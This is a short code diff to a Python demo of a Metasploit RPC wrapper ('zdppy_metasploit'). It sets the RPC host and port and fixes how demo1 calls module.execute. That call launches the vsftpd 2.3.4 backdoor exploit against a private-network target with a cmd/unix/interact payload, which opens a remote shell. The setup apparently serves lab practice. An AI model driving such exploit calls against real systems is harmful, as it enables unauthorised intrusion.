@@ -1,6 +1,6 @@
 from zdppy_metasploit import *
 
-msf = new_metasploit()
+msf = new_metasploit(host="192.168.213.131", port=55553)
 
 
 def demo1():
@@ -10,7 +10,7 @@ def demo1():
         2、同一个受控主机，这个漏洞只能同时被一个攻击机利用，如果被占用，则不会有session
     """
     opts = {'RHOSTS': '192.168.160.130', "PAYLOAD": "cmd/unix/interact"}
-    msf.log.info(msf.call(module.execute, ['exploit', 'unix/ftp/vsftpd_234_backdoor', opts]))
+    msf.log.info(msf.call("module.execute", ['exploit', 'unix/ftp/vsftpd_234_backdoor', opts]))
 
 
 def demo2():
